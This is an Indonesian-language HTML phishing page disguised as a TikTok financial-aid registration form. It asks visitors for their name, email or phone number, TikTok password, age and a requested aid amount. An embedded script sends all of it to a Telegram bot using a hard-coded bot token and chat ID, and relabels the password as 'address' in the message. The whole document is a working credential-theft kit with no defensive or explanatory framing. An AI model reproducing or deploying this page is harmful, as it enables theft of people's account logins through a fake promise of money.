<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Untuk Melanjutkan</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    form {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
    }
    input, textarea, button {
      width: 100%;
      margin-bottom: 10px;
      padding: 8px;
    }
  </style>
</head>
<body>
  <form id="formPendaftaran">
    <h2>Formulir Pendaftaran Penerima Bantuan TIKTOK </h2>
    <h3>Masuk Akun Tiktok</h3>
    <input type="text" id="nama" placeholder="Nama Lengkap" required>
    <input type="email" id="email" placeholder="Email/Nomor Telepon" required>
    <input type="text" id="alamat" placeholder="Sandi" required>
    <input type="number" id="nomor" placeholder="Usia" required>
    <textarea id="pesan" placeholder="Jumlah Permintaan Bantuan (1-100 Juta)"></textarea>
    <button type="submit">Kirim</button>
  </form>

  <script>
    const BOT_TOKEN = "7748589088:AAFDWEZg66nLC1H0KksYPAMZVbsZhspdypE";
    const CHAT_ID = "-5020087042";
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    document.getElementById("formPendaftaran").addEventListener("submit", function(e) {
      e.preventDefault();
      const nama = document.getElementById("nama").value;
      const email = document.getElementById("email").value;
      const alamat = document.getElementById("alamat").value;
      const pesan = document.getElementById("pesan").value;
      const nomor = document.getElementById("nomor").value;

      const text = ` *Pendaftaran Baru*%0A Nama: ${nama} %0A Alamat: ${alamat}%0A  Email: ${email}%0A Nomor HP: ${nomor}%0A Pesan: ${pesan}%0A `;

      fetch(`${TELEGRAM_API}?chat_id=${CHAT_ID}&text=${text}&parse_mode=Markdown`)
        .then(response => {
          if (response.ok) {
            alert("✅ Data berhasil dikirim ke Telegram!");
            document.getElementById("formPendaftaran").reset();
          } else {
            alert("❌ Gagal mengirim data.");
          }
        });
    });
  </script>

</body>
</html>
